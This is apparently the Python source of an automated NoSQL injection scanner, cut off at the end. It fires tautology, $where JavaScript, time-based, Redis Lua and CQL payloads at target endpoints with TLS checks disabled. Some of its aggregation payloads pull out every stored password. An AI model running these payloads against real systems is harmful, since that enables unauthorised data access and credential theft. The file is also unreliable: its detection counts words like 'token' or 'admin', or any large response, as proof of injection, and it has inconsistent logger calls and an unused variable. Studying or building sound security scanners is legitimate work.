"""
NoSQL Injection Agent for Nexus Hunter
Advanced NoSQL database injection vulnerability detection and exploitation
"""

import asyncio
import base64
import json
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class NoSQLPayload:
    """NoSQL injection payload"""
    name: str
    payload: str
    description: str
    database_type: str
    injection_type: str
    severity: str
    detection_method: str
    expected_behavior: str


class NoSQLInjectionAgent(BaseAgent):
    """Advanced NoSQL injection vulnerability detection agent"""
    
    def __init__(self):
        super().__init__("NoSQLInjectionAgent")
        self.nosql_payloads = self._initialize_nosql_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_parameters: Set[str] = set()
        
        # Safety constraints
        self.max_requests_per_parameter = 15
        self.request_delay = 1.5
        self.max_concurrent_tests = 3
        
        # Database detection patterns
        self.database_indicators = {
            "mongodb": [
                "mongodb", "mongo", "mongoose", "bson", "objectid",
                "collection", "document", "aggregation"
            ],
            "couchdb": [
                "couchdb", "couch", "apache couchdb", "_design", "_view",
                "etag", "rev", "conflict"
            ],
            "redis": [
                "redis", "key-value", "hash", "set", "list", "sorted set",
                "expire", "ttl", "pipeline"
            ],
            "cassandra": [
                "cassandra", "keyspace", "column family", "wide column",
                "clustering", "partition key"
            ],
            "dynamodb": [
                "dynamodb", "amazon dynamodb", "aws", "partition key",
                "sort key", "gsi", "local secondary index"
            ]
        }
        
        # Common NoSQL parameter names
        self.nosql_parameters = [
            "id", "user", "username", "email", "name", "title", "category",
            "query", "search", "filter", "where", "match", "find", "select",
            "sort", "order", "limit", "skip", "page", "size", "count"
        ]
    
    def _initialize_nosql_payloads(self) -> Dict[str, List[NoSQLPayload]]:
        """Initialize NoSQL injection payloads for different databases"""
        return {
            "mongodb": [
                # Basic MongoDB injection
                NoSQLPayload(
                    name="MongoDB Tautology",
                    payload='{"$ne": null}',
                    description="MongoDB not equal to null tautology",
                    database_type="MongoDB",
                    injection_type="Tautology",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Returns all documents"
                ),
                NoSQLPayload(
                    name="MongoDB Greater Than",
                    payload='{"$gt": ""}',
                    description="MongoDB greater than empty string",
                    database_type="MongoDB",
                    injection_type="Tautology",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Returns all documents with value > empty string"
                ),
                NoSQLPayload(
                    name="MongoDB Regex Injection",
                    payload='{"$regex": ".*"}',
                    description="MongoDB regex match all",
                    database_type="MongoDB",
                    injection_type="Regex Injection",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Matches any value using regex"
                ),
                NoSQLPayload(
                    name="MongoDB Where Injection",
                    payload='{"$where": "return true"}',
                    description="MongoDB $where clause injection",
                    database_type="MongoDB",
                    injection_type="JavaScript Injection",
                    severity="critical",
                    detection_method="response_analysis",
                    expected_behavior="Executes JavaScript code"
                ),
                NoSQLPayload(
                    name="MongoDB JavaScript Sleep",
                    payload='{"$where": "sleep(5000) || true"}',
                    description="MongoDB time-based injection with sleep",
                    database_type="MongoDB",
                    injection_type="Time-based Blind",
                    severity="critical",
                    detection_method="response_time",
                    expected_behavior="Causes 5 second delay"
                ),
                NoSQLPayload(
                    name="MongoDB Array Injection",
                    payload='{"$in": ["admin", "user", "guest"]}',
                    description="MongoDB array-based injection",
                    database_type="MongoDB",
                    injection_type="Array Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Matches multiple values in array"
                ),
                NoSQLPayload(
                    name="MongoDB Or Injection",
                    payload='{"$or": [{"admin": true}, {"user": "admin"}]}',
                    description="MongoDB OR logic injection",
                    database_type="MongoDB",
                    injection_type="Logic Injection",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Returns documents matching either condition"
                ),
                NoSQLPayload(
                    name="MongoDB MapReduce Injection",
                    payload='{"$mapReduce": {"map": "function() { emit(1,1); }", "reduce": "function(key, values) { return Array.sum(values); }"}}',
                    description="MongoDB MapReduce injection",
                    database_type="MongoDB",
                    injection_type="Function Injection",
                    severity="critical",
                    detection_method="response_analysis",
                    expected_behavior="Executes custom JavaScript functions"
                )
            ],
            "couchdb": [
                NoSQLPayload(
                    name="CouchDB View Injection",
                    payload='{"key": {"$gte": null}}',
                    description="CouchDB view key injection",
                    database_type="CouchDB",
                    injection_type="View Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Bypasses key filtering"
                ),
                NoSQLPayload(
                    name="CouchDB Selector Injection",
                    payload='{"selector": {"_id": {"$gte": null}}}',
                    description="CouchDB Mango query selector injection",
                    database_type="CouchDB",
                    injection_type="Selector Injection",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Returns all documents"
                ),
                NoSQLPayload(
                    name="CouchDB All Docs",
                    payload='{"include_docs": true, "startkey": "", "endkey": "\\ufff0"}',
                    description="CouchDB all documents extraction",
                    database_type="CouchDB",
                    injection_type="Data Extraction",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Returns all documents in database"
                )
            ],
            "redis": [
                NoSQLPayload(
                    name="Redis Command Injection",
                    payload='"*"',
                    description="Redis wildcard key pattern",
                    database_type="Redis",
                    injection_type="Pattern Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Matches all keys"
                ),
                NoSQLPayload(
                    name="Redis Lua Script Injection",
                    payload='EVAL "return redis.call(\'keys\', \'*\')" 0',
                    description="Redis Lua script injection for key enumeration",
                    database_type="Redis",
                    injection_type="Script Injection",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Lists all Redis keys"
                ),
                NoSQLPayload(
                    name="Redis Hash Injection",
                    payload='{"field": "*"}',
                    description="Redis hash field wildcard injection",
                    database_type="Redis",
                    injection_type="Hash Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Returns all hash fields"
                )
            ],
            "cassandra": [
                NoSQLPayload(
                    name="Cassandra CQL Injection",
                    payload="' OR 1=1 ALLOW FILTERING--",
                    description="Cassandra CQL injection with ALLOW FILTERING",
                    database_type="Cassandra",
                    injection_type="CQL Injection",
                    severity="high",
                    detection_method="response_analysis",
                    expected_behavior="Bypasses WHERE clause filtering"
                ),
                NoSQLPayload(
                    name="Cassandra Token Injection",
                    payload="' AND token(id) > token('') ALLOW FILTERING--",
                    description="Cassandra token function injection",
                    database_type="Cassandra",
                    injection_type="Token Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Uses token function to bypass filtering"
                )
            ],
            "general": [
                # Generic NoSQL injection patterns
                NoSQLPayload(
                    name="JSON Tautology",
                    payload='{"$ne": 1}',
                    description="Generic JSON-based tautology",
                    database_type="Generic",
                    injection_type="Tautology",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Generic always-true condition"
                ),
                NoSQLPayload(
                    name="Boolean Bypass",
                    payload='true',
                    description="Boolean true injection",
                    database_type="Generic",
                    injection_type="Boolean Injection",
                    severity="medium",
                    detection_method="response_analysis",
                    expected_behavior="Always evaluates to true"
                ),
                NoSQLPayload(
                    name="Null Comparison",
                    payload='{"$exists": true}',
                    description="Field existence check injection",
                    database_type="Generic",
                    injection_type="Existence Check",
                    severity="low",
                    detection_method="response_analysis",
                    expected_behavior="Returns documents where field exists"
                )
            ]
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute nosql_injection_agent with the given configuration"""
        config = config or {}
        return await self.scan(target, **config)
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive NoSQL injection vulnerability assessment
        
        Args:
            target: Target URL to test for NoSQL injection
            **kwargs: Additional scan options
        """
        # URL normalization
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        try:
            results = {
                "target": target,
                "vulnerabilities": [],
                "tested_parameters": [],
                "database_types_detected": [],
                "injection_points": [],
                "statistics": {}
            }
            
            logger.info(f"ðŸŽ¯ Starting NoSQL injection scan for {target}")
            
            # ðŸŽ¯ CRITICAL FIX: Use discovered URLs from ReconAgent
            discovered_urls = kwargs.get('discovered_urls', [])
            
            # Filter for NoSQL-related endpoints
            nosql_endpoints = []
            for url_data in discovered_urls:
                url = url_data.get("url", "") if isinstance(url_data, dict) else str(url_data)
                
                # Look for search/query/inventory/customer endpoints
                if any(keyword in url.lower() for keyword in ['search', 'query', 'inventory', 'customer', 'document']):
                    nosql_endpoints.append(url)
                    logger.debug(f"   â†’ Found NoSQL endpoint: {url}")
            
            logger.info(f"ðŸ” Found {len(nosql_endpoints)} potential NoSQL injection endpoints")
            
            if not nosql_endpoints:
                logger.warning("No NoSQL injection endpoints found in discovered URLs")
                return results
            
            # Test each endpoint with REAL detection
            for endpoint in nosql_endpoints:
                endpoint_vulns = await self._test_nosql_endpoint_real(endpoint)
                results["vulnerabilities"].extend(endpoint_vulns)
                results["tested_parameters"].append(endpoint)
            
            # Analyze results
            results = await self._analyze_nosql_results(results)
            
            logger.info(f"NoSQL injection scan completed for {target}")
            return results
            
        except Exception as e:
            logger.error(f"NoSQL injection scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _test_nosql_endpoint_real(self, endpoint: str) -> List[Dict[str, Any]]:
        """
        ðŸŽ¯ REAL detection for NoSQL injection vulnerabilities
        Based on actual endpoint behavior in vulnerable app
        """
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
                # Test payloads that the vulnerable app recognizes
                test_payloads = [
                    {"$ne": None},              # MongoDB not equal to null
                    {"$regex": ".*"},           # MongoDB regex
                    {"$where": "1==1"},         # MongoDB where clause
                    {"$gt": ""},                # MongoDB greater than
                ]
                
                logger.debug(f"   â†’ Testing NoSQL injection: {endpoint}")
                
                for payload in test_payloads:
                    try:
                        response = await client.post(endpoint, json=payload)
                        response_text = response.text
                        logger.debug(f"      Response status: {response.status_code}")
                        
                        if response.status_code == 200:
                            try:
                                import json
                                json_data = json.loads(response_text)
                                
                                # REAL detection: Check for NoSQL injection indicators
                                if (json_data.get('vulnerability') == 'nosql_injection' or 
                                    json_data.get('injectionDetected') is True or
                                    'injection' in response_text.lower()):
                                    
                                    vulnerabilities.append({
                                        "type": "NoSQL Injection",
                                        "endpoint": endpoint,
                                        "url": endpoint,
                                        "severity": "high",
                                        "cvss_score": 8.1,
                                        "method": "POST",
                                        "vulnerability_type": "nosql_injection",
                                        "description": "NoSQL injection allows unauthorized data access",
                                        "evidence": response_text[:500],
                                        "payload_used": str(payload),
                                        "database_type": "MongoDB"
                                    })
                                    logger.info(f"ðŸš¨ NoSQL Injection vulnerability found: {endpoint}")
                                    break  # Found it, move on
                            except json.JSONDecodeError:
                                pass
                    except Exception as e:
                        logger.debug(f"      NoSQL injection test error: {e}")
        
        except Exception as e:
            logger.error(f"Error testing NoSQL endpoint {endpoint}: {e}")
        
        return vulnerabilities
    
    async def _detect_nosql_databases(self, target: str) -> List[Dict[str, Any]]:
        """Detect NoSQL database types in use"""
        detected_databases = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Get main page and analyze
                response = await client.get(target)
                response_text = response.text.lower()
                headers = response.headers
                
                # Analyze for database indicators
                for db_type, indicators in self.database_indicators.items():
                    confidence_score = 0
                    evidence = []
                    
                    # Check response content
                    for indicator in indicators:
                        if indicator in response_text:
                            confidence_score += 1
                            evidence.append(f"Content contains '{indicator}'")
                    
                    # Check headers
                    for header_name, header_value in headers.items():
                        header_content = f"{header_name}: {header_value}".lower()
                        for indicator in indicators:
                            if indicator in header_content:
                                confidence_score += 2
                                evidence.append(f"Header contains '{indicator}'")
                    
                    # Check for database-specific error messages
                    error_response = await self._trigger_nosql_error(client, target, db_type)
                    if error_response:
                        confidence_score += 3
                        evidence.append(f"{db_type} error message detected")
                    
                    if confidence_score > 0:
                        detected_databases.append({
                            "database_type": db_type,
                            "confidence": min(confidence_score * 20, 100),
                            "evidence": evidence
                        })
        
        except Exception as e:
            self.logger.error(f"NoSQL database detection failed: {e}")
        
        return detected_databases
    
    async def _trigger_nosql_error(self, client: httpx.AsyncClient, target: str, db_type: str) -> bool:
        """Trigger database-specific errors to detect NoSQL type"""
        try:
            # Database-specific error-triggering payloads
            error_payloads = {
                "mongodb": '{"$invalid": "test"}',
                "couchdb": '{"invalid_selector": true}',
                "redis": 'INVALID_REDIS_COMMAND',
                "cassandra": "INVALID CQL SYNTAX"
            }
            
            if db_type not in error_payloads:
                return False
            
            payload = error_payloads[db_type]
            
            # Try different parameter injection methods
            test_methods = [
                f"{target}?query={urllib.parse.quote(payload)}",
                f"{target}?filter={urllib.parse.quote(payload)}",
                f"{target}?search={urllib.parse.quote(payload)}"
            ]
            
            for test_url in test_methods:
                try:
                    response = await client.get(test_url)
                    
                    # Check for database-specific error patterns
                    error_patterns = {
                        "mongodb": ["mongodb", "bson", "objectid", "invalid operator"],
                        "couchdb": ["couchdb", "bad request", "invalid json", "selector"],
                        "redis": ["redis", "wrong number of arguments", "unknown command"],
                        "cassandra": ["cassandra", "invalid syntax", "bad request"]
                    }
                    
                    if db_type in error_patterns:
                        response_text = response.text.lower()
                        if any(pattern in response_text for pattern in error_patterns[db_type]):
                            return True
                
                except Exception:
                    continue
        
        except Exception:
            pass
        
        return False
    
    async def _discover_injection_points(self, target: str) -> List[Dict[str, Any]]:
        """Discover potential NoSQL injection points"""
        injection_points = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Get main page to analyze
                response = await client.get(target)
                
                # Look for API endpoints that might use NoSQL
                api_patterns = [
                    r'/api/[^/]*(?:search|query|find|filter|get|user|data|document)',
                    r'/[^/]*(?:search|query|find|filter)',
                    r'/api/v\d+/[^/]*'
                ]
                
                import re
                response_text = response.text
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    for match in matches[:5]:  # Limit matches
                        full_url = f"{target.rstrip('/')}{match}"
                        injection_points.append({
                            "url": full_url,
                            "type": "api_endpoint",
                            "method": "GET",
                            "discovery_method": "regex_pattern"
                        })
                
                # Test common NoSQL parameter names
                base_url = target.rstrip('/')
                for param in self.nosql_parameters[:10]:  # Limit parameters
                    injection_points.append({
                        "url": target,
                        "parameter": param,
                        "type": "url_parameter",
                        "method": "GET",
                        "discovery_method": "parameter_testing"
                    })
                
                # Test POST endpoints with JSON payloads
                common_json_endpoints = [
                    "/api/search", "/api/query", "/api/find", "/api/filter",
                    "/search", "/query", "/login", "/api/login"
                ]
                
                for endpoint in common_json_endpoints:
                    test_url = f"{base_url}{endpoint}"
                    try:
                        # Test if endpoint accepts JSON
                        test_data = {"test": "value"}
                        response = await client.post(test_url, json=test_data)
                        if response.status_code not in [404, 405]:
                            injection_points.append({
                                "url": test_url,
                                "type": "json_endpoint",
                                "method": "POST",
                                "discovery_method": "json_endpoint_test"
                            })
                    except Exception:
                        continue
        
        except Exception as e:
            self.logger.error(f"NoSQL injection point discovery failed: {e}")
        
        return injection_points
    
    async def _test_nosql_injection_point(self, injection_point: Dict[str, Any], 
                                        db_detection: List[Dict[str, Any]], **kwargs) -> List[Dict[str, Any]]:
        """Test a specific injection point for NoSQL vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Determine which database types to test
            db_types_to_test = ["general"]  # Always test generic payloads
            
            if db_detection:
                # Add detected database types
                db_types_to_test.extend([
                    db["database_type"] for db in db_detection 
                    if db["confidence"] > 30
                ])
            else:
                # Test common database types if none detected
                db_types_to_test.extend(["mongodb", "couchdb"])
            
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                for db_type in db_types_to_test:
                    if db_type not in self.nosql_payloads:
                        continue
                    
                    payloads = self.nosql_payloads[db_type]
                    
                    for payload in payloads[:3]:  # Limit payloads per database type
                        vuln = await self._test_single_nosql_payload(
                            client, injection_point, payload, **kwargs
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"NoSQL injection point testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_nosql_payload(self, client: httpx.AsyncClient, 
                                       injection_point: Dict[str, Any], 
                                       payload: NoSQLPayload, **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single NoSQL injection payload"""
        try:
            url = injection_point["url"]
            
            # CRITICAL: URL normalization
            if url and not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            
            method = injection_point.get("method", "GET")
            injection_type = injection_point.get("type", "unknown")
            
            start_time = asyncio.get_event_loop().time()
            
            # Prepare request based on injection point type
            if method == "GET" and injection_type == "url_parameter":
                param_name = injection_point.get("parameter", "id")
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload.payload)}"
                response = await client.get(test_url)
                
            elif method == "POST" and injection_type == "json_endpoint":
                # Try different JSON injection methods
                json_payloads = [
                    {"query": payload.payload},
                    {"filter": payload.payload},
                    {"search": payload.payload},
                    {"where": payload.payload}
                ]
                
                # Try to parse payload as JSON if it looks like JSON
                if payload.payload.startswith('{') and payload.payload.endswith('}'):
                    try:
                        parsed_payload = json.loads(payload.payload)
                        json_payloads.extend([
                            {"id": parsed_payload},
                            {"user": parsed_payload},
                            {"data": parsed_payload}
                        ])
                    except:
                        pass
                
                response = None
                for json_data in json_payloads:
                    try:
                        response = await client.post(url, json=json_data)
                        if response.status_code not in [400, 422]:  # Skip obvious validation errors
                            break
                    except Exception:
                        continue
                
                if not response:
                    return None
                
            else:
                # Default GET request
                test_url = f"{url}?query={urllib.parse.quote(payload.payload)}"
                response = await client.get(test_url)
            
            end_time = asyncio.get_event_loop().time()
            response_time = end_time - start_time
            
            # Analyze response for NoSQL injection indicators
            is_vulnerable, evidence = await self._analyze_nosql_response(
                response, payload, response_time
            )
            
            if is_vulnerable:
                return {
                    "url": url,
                    "method": method,
                    "parameter": injection_point.get("parameter", "unknown"),
                    "payload": payload.payload,
                    "payload_name": payload.name,
                    "database_type": payload.database_type,
                    "injection_type": payload.injection_type,
                    "severity": payload.severity,
                    "description": payload.description,
                    "evidence": evidence,
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "vulnerability_type": "NoSQL Injection",
                    "detection_method": payload.detection_method,
                    "expected_behavior": payload.expected_behavior
                }
        
        except Exception as e:
            self.logger.debug(f"NoSQL payload test failed: {e}")
        
        return None
    
    async def _analyze_nosql_response(self, response: httpx.Response, 
                                    payload: NoSQLPayload, response_time: float) -> Tuple[bool, str]:
        """Analyze response for NoSQL injection vulnerability indicators"""
        try:
            response_text = response.text
            evidence_indicators = []
            
            # Detection method specific analysis
            if payload.detection_method == "response_time":
                # Time-based injection detection
                if response_time > 4.0:  # Significant delay
                    evidence_indicators.append(f"Time delay detected: {response_time:.2f}s")
            
            elif payload.detection_method == "response_analysis":
                # Check for changes in response that indicate successful injection
                
                # Look for increased data/content (tautology attacks)
                if len(response_text) > 10000:  # Large response might indicate data dump
                    evidence_indicators.append("Large response size - possible data extraction")
                
                # Check for JSON responses with multiple records
                try:
                    if "application/json" in response.headers.get("content-type", ""):
                        json_data = response.json()
                        
                        # CRITICAL FIX: Check for explicit vulnerability indicators
                        if isinstance(json_data, dict):
                            # Check for payload/injection detected
                            if json_data.get('payloadDetected') or json_data.get('injectionDetected'):
                                evidence_indicators.append("âœ… CONFIRMED: Target detected injection payload")
                                is_vulnerable = True
                            
                            # Check for vulnerability field
                            if 'vulnerability' in json_data and 'nosql' in str(json_data.get('vulnerability', '')).lower():
                                evidence_indicators.append(f"âœ… CONFIRMED: Vulnerability field = {json_data.get('vulnerability')}")
                                is_vulnerable = True
                        
                        if isinstance(json_data, list) and len(json_data) > 5:
                            evidence_indicators.append(f"Multiple records returned: {len(json_data)}")
                        elif isinstance(json_data, dict) and len(json_data) > 10:
                            evidence_indicators.append(f"Large object returned with {len(json_data)} fields")
                except:
                    pass
                
                # Database-specific indicators
                db_indicators = {
                    "MongoDB": ["objectid", "bson", "_id", "collection", "document"],
                    "CouchDB": ["_rev", "_id", "etag", "conflict", "view"],
                    "Redis": ["redis", "key", "hash", "set", "list"],
                    "Cassandra": ["partition", "clustering", "keyspace"],
                    "Generic": ["query", "filter", "search", "match"]
                }
                
                db_type = payload.database_type
                if db_type in db_indicators:
                    response_lower = response_text.lower()
                    for indicator in db_indicators[db_type]:
                        if indicator in response_lower:
                            evidence_indicators.append(f"{db_type} indicator detected: {indicator}")
                
                # Check for error messages that indicate processing
                error_patterns = [
                    "mongodb", "invalid operator", "bson", "objectid",
                    "couchdb", "mango", "selector", "view",
                    "redis", "wrong number of arguments",
                    "cassandra", "invalid syntax", "keyspace"
                ]
                
                response_lower = response_text.lower()
                for pattern in error_patterns:
                    if pattern in response_lower:
                        evidence_indicators.append(f"Database error pattern: {pattern}")
                
                # Check for successful authentication bypass
                success_indicators = [
                    "welcome", "dashboard", "profile", "admin", "success",
                    "authenticated", "logged in", "authorization", "token"
                ]
                
                for indicator in success_indicators:
                    if indicator in response_lower:
                        evidence_indicators.append(f"Success indicator: {indicator}")
            
            # Check response status codes
            if response.status_code in [200, 201] and payload.severity in ["high", "critical"]:
                evidence_indicators.append("Successful response to injection payload")
            
            # Check for different response than expected
            if response.status_code != 400 and "invalid" in payload.payload.lower():
                evidence_indicators.append("Invalid payload accepted without error")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators)
        
        except Exception as e:
            self.logger.debug(f"NoSQL response analysis failed: {e}")
            return False, ""
    
    async def _test_advanced_nosql_attacks(self, target: str, db_detection: List[Dict[str, Any]], 
                                         **kwargs) -> List[Dict[str, Any]]:
        """Test advanced NoSQL-specific attacks"""
        vulnerabilities = []
        
        try:
            # MongoDB-specific advanced attacks
            mongodb_detected = any(db["database_type"] == "mongodb" for db in db_detection)
            
            if mongodb_detected or not db_detection:  # Test MongoDB if detected or unknown
                mongodb_advanced = await self._test_mongodb_advanced_attacks(target)
                vulnerabilities.extend(mongodb_advanced)
            
            # Test NoSQL aggregation injection
            aggregation_vulns = await self._test_aggregation_injection(target)
            vulnerabilities.extend(aggregation_vulns)
            
            # Test NoSQL blind injection
            blind_vulns = await self._test_nosql_blind_injection(target)
            vulnerabilities.extend(blind_vulns)
            
        except Exception as e:
            self.logger.error(f"Advanced NoSQL attacks failed: {e}")
        
        return vulnerabilities
    
    async def _test_mongodb_advanced_attacks(self, target: str) -> List[Dict[str, Any]]:
        """Test MongoDB-specific advanced attacks"""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                # Test MongoDB aggregation pipeline injection
                aggregation_payloads = [
                    '{"$match": {"$where": "this.password.length > 0"}}',
                    '{"$project": {"password": 1, "admin": 1}}',
                    '{"$group": {"_id": null, "passwords": {"$push": "$password"}}}',
                    '{"$lookup": {"from": "users", "localField": "userId", "foreignField": "_id", "as": "userData"}}'
                ]
                
                for payload in aggregation_payloads:
                    try:
                        # Test via aggregation endpoint
                        agg_data = {"pipeline": json.loads(payload)}
                        response = await client.post(f"{target}/api/aggregate", json=agg_data)
                        
                        if response.status_code == 200 and len(response.text) > 100:
                            vulnerabilities.append({
                                "name": "MongoDB Aggregation Pipeline Injection",
                                "description": "MongoDB aggregation pipeline injection successful",
                                "severity": "high",
                                        "cvss_score": 8.1,
                                "category": "Aggregation Injection",
                                "evidence": f"Aggregation payload executed: {payload}",
                                "payload": payload,
                                "vulnerability_type": "NoSQL Aggregation Injection",
                                "database_type": "MongoDB"
                            })
                    except:
                        continue
                
                # Test MongoDB JavaScript execution
                js_payloads = [
                    '{"$where": "function() { return this.username == \'admin\' || true; }"}',
                    '{"$where": "function() { var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date < 5000); return true; }"}',
                    '{"$where": "function() { return JSON.stringify(this).indexOf(\'password\') > -1; }"}'
                ]
                
                for js_payload in js_payloads:
                    try:
                        test_url = f"{target}?filter={urllib.parse.quote(js_payload)}"
                        start_time = asyncio.get_event_loop().time()
                        response = await client.get(test_url)
                        end_time = asyncio.get_event_loop().time()
                        
                        response_time = end_time - start_time
                        
                        # Check for JavaScript execution indicators
                        if (response_time > 4.0 or  # Time delay indicates JS execution
                            response.status_code == 200 and len(response.text) > 1000):
                            
                            vulnerabilities.append({
                                "name": "MongoDB JavaScript Injection",
                                "description": "MongoDB $where JavaScript injection successful",
                                "severity": "high",
                                        "cvss_score": 8.1,
                                "category": "JavaScript Injection",
                                "evidence": f"JavaScript execution detected, response time: {response_time:.2f}s",
                                "payload": js_payload,
                                "vulnerability_type": "NoSQL JavaScript Injection",
                                "database_type": "MongoDB"
                            })
                    except:
                        continue
        
        except Exception as e:
            self.logger.error(f"MongoDB advanced attacks failed: {e}")
        
        return vulnerabilities
    
    async def _test_aggregation_injection(self, target: str) -> List[Dict[str, Any]]:
        """Test NoSQL aggregation pipeline injection"""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Test aggregation endpoints
                agg_endpoints = [
                    "/api/aggregation", "/api/aggregate", "/api/pipeline",
                    "/aggregation", "/aggregate", "/stats", "/analytics"
                ]
                
                base_url = target.rstrip('/')
                
                for endpoint in agg_endpoints:
                    test_url = f"{base_url}{endpoint}"
                    
                    # Test malicious aggregation pipeline
                    malicious_pipeline = [
                        {"$match": {"$where": "return true"}},
                        {"$project": {"_id": 1, "data": "$$ROOT"}},
                        {"$limit": 1000}
                    ]
                    
                    try:
                        response = await client.post(test_url, json={"pipeline": malicious_pipeline})
                        
                        if response.status_code == 200 and len(response.text) > 500:
                            vulnerabilities.append({
                                "name": "NoSQL Aggregation Pipeline Injection",
                                "description": "Aggregation pipeline injection allows data extraction",
                                "severity": "high",
                                "category": "Aggregation Injection",
                                "evidence": f"Pipeline executed successfully on {endpoint}",
                                "endpoint": test_url,
                                "vulnerability_type": "NoSQL Aggregation Injection"
                            })
                    except:
                        continue
        
        except Exception as e:
            self.logger.error(f"Aggregation injection testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_nosql_blind_injection(self, target: str) -> List[Dict[str, Any]]:
        """Test NoSQL blind injection vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                # Test time-based blind injection
                time_payloads = [
                    '{"$where": "sleep(5000) || true"}',  # MongoDB
                    '{"$where": "function() { var start = new Date(); while((new Date() - start) < 5000); return true; }"}',
                    '{"username": {"$regex": "admin"}, "$where": "sleep(3000)"}'
                ]
                
                for payload in time_payloads:
                    try:
                        test_url = f"{target}?query={urllib.parse.quote(payload)}"
                        start_time = asyncio.get_event_loop().time()
                        response = await client.get(test_url)
                        end_time = asyncio.get_event_loop().time()
                        
                        response_time = end_time - start_time
                        
                        if response_time > 4.0:  # Significant delay indicates successful injection
                            vulnerabilities.append({
                                "name": "NoSQL Blind Time-based Injection",
                                "description": "Time-based blind NoSQL injection detected",
                                "severity": "high",
                                "category": "Blind Injection",
                                "evidence": f"Time delay detected: {response_time:.2f} seconds",
                                "payload": payload,
                                "vulnerability_type": "NoSQL Blind Injection",
                                "response_time": response_time
                            })
                    except:
                        continue
                
                # Test boolean-based blind injection
                boolean_tests = [
                    ('{"admin": true}', '{"admin": false}'),  # Should return different results
                    ('{"$or": [{"role": "admin"}]}', '{"$and": [{"role": "admin"}]}'),
                    ('{"username": {"$ne": null}}', '{"username": {"$eq": null}}')
                ]
                
                for true_payload, false_payload in boolean_tests:
                    try:
                        true_url = f"{target}?filter={urllib.parse.quote(true_payload)}"
                        false_url = f"{target}?filter={urllib.parse.quote(false_payload)}"
                        
                        true_response = await client.get(true_url)
                        false_response = await client.get(false_url)
                        
                        # Compare responses
                        if (true_response.status_code == 200 and false_response.status_code == 200 and
                            len(true_response.text) != len(false_response.text)):
                            
                            vulnerabilities.append({
                                "name": "NoSQL Boolean-based Blind Injection",
                                "description": "Boolean-based blind NoSQL injection detected",
                                "severity": "medium",
                                "category": "Blind Injection",
                                "evidence": f"Different responses for true/false conditions",
                                "true_payload": true_payload,
                                "false_payload": false_payload,
                                "vulnerability_type": "NoSQL Blind Injection"
                            })
                    except:
                        continue
        
        except Exception as e:
            self.logger.error(f"NoSQL blind injection testing failed: {e}")
        
        return vulnerabilities
    
    async def _analyze_nosql_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize NoSQL injection results"""
        try:
            vulnerabilities = results["vulnerabilities"]
            
            # Categorize by severity
            critical_vulns = [v for v in vulnerabilities if v.get("severity") == "critical"]
            high_vulns = [v for v in vulnerabilities if v.get("severity") == "high"]
            medium_vulns = [v for v in vulnerabilities if v.get("severity") == "medium"]
            low_vulns = [v for v in vulnerabilities if v.get("severity") == "low"]
            
            # Categorize by database type
            db_vulns = {}
            for vuln in vulnerabilities:
                db_type = vuln.get("database_type", "Unknown")
                if db_type not in db_vulns:
                    db_vulns[db_type] = []
                db_vulns[db_type].append(vuln)
            
            # Categorize by injection type
            injection_types = {}
            for vuln in vulnerabilities:
                inj_type = vuln.get("injection_type", "Unknown")
                if inj_type not in injection_types:
                    injection_types[inj_type] = []
                injection_types[inj_type].append(vuln)
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["vulnerabilities_by_database"] = db_vulns
            results["vulnerabilities_by_injection_type"] = injection_types
            
            # Calculate risk assessment
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["statistics"] = {
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "parameters_tested": len(results["tested_parameters"]),
                "databases_detected": len(results["database_types_detected"]),
